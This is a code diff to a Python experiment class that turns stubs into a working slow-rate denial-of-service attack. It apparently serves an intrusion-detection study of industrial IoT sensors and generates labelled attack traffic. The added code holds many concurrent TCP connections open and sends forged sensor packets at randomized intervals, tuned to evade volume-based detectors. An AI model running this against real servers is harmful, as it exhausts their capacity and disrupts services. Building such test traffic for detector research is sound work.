@@ -6,67 +6,157 @@
 """
 
 from core.base_experiment import BaseExperiment
+import socket
+import struct
+import time
+import random
+import threading
 
+_PACKET_FMT = "<HBBIQfffffffffffffffffffffffffff"
+
+def _crc16_ccitt(data: bytes) -> int:
+    crc = 0xFFFF
+    for byte in data:
+        crc ^= byte << 8
+        for _ in range(8):
+            if crc & 0x8000:
+                crc = (crc << 1) ^ 0x1021
+            else:
+                crc <<= 1
+            crc &= 0xFFFF
+    return crc
+
+def _build_normal_packet(seq: int, node_id: int = 1) -> bytes:
+    body = struct.pack(
+        _PACKET_FMT,
+        0xABCD, 1, node_id, seq, int(time.time() * 1000),
+        0.05, 0.03, 0.08,
+        0.45, 0.38, 0.52,
+        0.44, 0.37, 0.51,
+        1.20, 1.05, 1.35,
+       -1.10,-0.95,-1.25,
+        2.30, 2.00, 2.60,
+        0.12, 0.08, 0.15,
+        3.10, 2.95, 3.20,
+        2.67, 2.76, 2.60,
+    )
+    crc = _crc16_ccitt(body)
+    return body + struct.pack("<H", crc)
 
 class SlowDoSExperiment(BaseExperiment):
     """
     Evaluates the slow resource exhaustion detection capabilities of the cyber
-    intrusion detection system by maintaining a long-lived connection with an
+    intrusion detection system by maintaining long-lived connections with an
     intentionally reduced transmission rate.
 
-    Unlike high-rate flooding attacks, this experiment transmits packets at a
-    rate far below the normal operating cadence of the legitimate IIoT sensor.
-    The objective is to hold open a connection while consuming the server's
-    listening socket capacity without generating features that trigger volume-based
-    anomaly thresholds.
-
-    Scientific purpose:
-        Determine whether temporal features such as mean_interarrival_time,
-        max_interarrival_time, and connection_duration are sufficient to identify
-        slow, intentionally paced connections that deviate significantly from the
-        normal 2-second physical feature extraction interval of the ESP32.
-
-    Framework integration:
-        The ExperimentManager automatically assigns the 'SlowDoSExperiment' label
-        to all EdgeNode windows captured during the run() phase via the LabelManager.
-        Dataset archival is performed automatically by the DatasetSynchronizer after
-        cleanup() completes.
+    This experiment uses multiple concurrent sockets to hold open connections
+    while consuming the server's listening socket capacity without generating
+    features that trigger volume-based anomaly thresholds.
     """
 
     def initialize(self) -> None:
-        """
-        Load configuration parameters and prepare the slow transmission pipeline.
-
-        TODO (future implementation):
-            - Read target Edge Node IP and port from self.experiment_config.
-            - Read the configured slow transmission interval (seconds) from config.
-            - Validate that the configured interval is significantly larger than the
-              normal sensor interval to ensure the attack is distinguishable.
-            - Prepare any minimal packet payload to be transmitted at each interval.
-        """
+        cfg = self.config.get("slowdrain", {})
+        self.interval_sec = cfg.get("interval_sec", 20.0)
+        self.target_ip = self.config.get("server_ip", "127.0.0.1")
+        self.target_port = self.config.get("server_port", 9000)
+        self.concurrent_sockets = cfg.get("concurrent_sockets", 10)
+        
+        self.sent = 0
+        self.errors = 0
+        self.sockets = []
+        self.lock = threading.Lock()
         self._log_initialized()
 
-    def run(self) -> None:
-        """
-        Execute the SlowDoS experiment for the configured attack_duration.
+    def _slow_drain_worker(self, worker_id: int, attack_duration: float):
+        sock = None
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5.0)
+            sock.connect((self.target_ip, self.target_port))
+            sock.settimeout(self.interval_sec + 10.0)
+            with self.lock:
+                self.sockets.append(sock)
+            self.logger.info(f"[{self.name}-W{worker_id}] Connected.")
+        except Exception as e:
+            self.logger.error(f"[{self.name}-W{worker_id}] Cannot connect: {e}")
+            return
 
-        TODO (future implementation):
-            - Observe the baseline for pre_attack_duration seconds.
-            - Open a TCP socket to the target Edge Node and hold it open.
-            - Transmit one minimal packet every slow_interval seconds to keep
-              the connection alive without triggering volume-based detectors.
-            - Maintain the open connection for the full attack_duration.
-            - Observe post-attack baseline for post_attack_duration seconds.
-        """
+        deadline = time.time() + attack_duration
+        seq = 0
+        
+        while time.time() < deadline:
+            pkt = _build_normal_packet(seq)
+            try:
+                sock.sendall(pkt)
+                try:
+                    ack = sock.recv(1)
+                except socket.timeout:
+                    pass
+
+                with self.lock:
+                    self.sent += 1
+                seq += 1
+            except Exception as e:
+                with self.lock:
+                    self.errors += 1
+                self.logger.error(f"[{self.name}-W{worker_id}] Send error: {e}")
+                try:
+                    if sock:
+                        sock.close()
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5.0)
+                    sock.connect((self.target_ip, self.target_port))
+                    sock.settimeout(self.interval_sec + 10.0)
+                    with self.lock:
+                        self.sockets.append(sock)
+                except Exception:
+                    break
+
+            remaining = deadline - time.time()
+            if remaining <= 0:
+                break
+            
+            # Randomize delay between 5s and 25s for realistic jitter
+            current_interval = random.uniform(5.0, 25.0)
+            sleep_time = min(current_interval, remaining)
+            time.sleep(sleep_time)
+
+    def run(self) -> None:
         self._log_started()
+        
+        pre_attack = self.experiment_config.get("pre_attack_duration", 5.0)
+        self.logger.info(f"[{self.name}] Observing pre-attack baseline for {pre_attack}s...")
+        time.sleep(pre_attack)
+
+        attack_duration = self.experiment_config.get("attack_duration", 60.0)
+        self.logger.info(f"[{self.name}] SLOW DRAIN ATTACK — {self.concurrent_sockets} concurrent sockets against {self.target_ip}:{self.target_port}")
+        
+        threads = []
+        for i in range(self.concurrent_sockets):
+            t = threading.Thread(target=self._slow_drain_worker, args=(i, attack_duration))
+            t.daemon = True  # Ensures threads die if main program aborts
+            threads.append(t)
+            t.start()
+            # Stagger connections slightly so they don't all hit the server at the exact same millisecond
+            time.sleep(0.1)
+            
+        # Use a timeout in join to ensure Ctrl+C (KeyboardInterrupt) can be caught during the 1.5 hours
+        for t in threads:
+            while t.is_alive():
+                t.join(1.0)
+        
+        post_attack = self.experiment_config.get("post_attack_duration", 5.0)
+        self.logger.info(f"[{self.name}] Observing post-attack baseline for {post_attack}s...")
+        time.sleep(post_attack)
+        
         self._log_completed()
 
     def cleanup(self) -> None:
-        """
-        Release all resources allocated during initialize().
-
-        TODO (future implementation):
-            - Close the long-lived TCP connection gracefully.
-            - Log the total connection lifetime and number of packets transmitted.
-        """
+        with self.lock:
+            for sock in self.sockets:
+                try:
+                    sock.close()
+                except:
+                    pass
+        self.logger.info(f"[{self.name}] Slow drain complete: {self.sent} packets sent, {self.errors} errors.")
         self._log_cleaned_up()
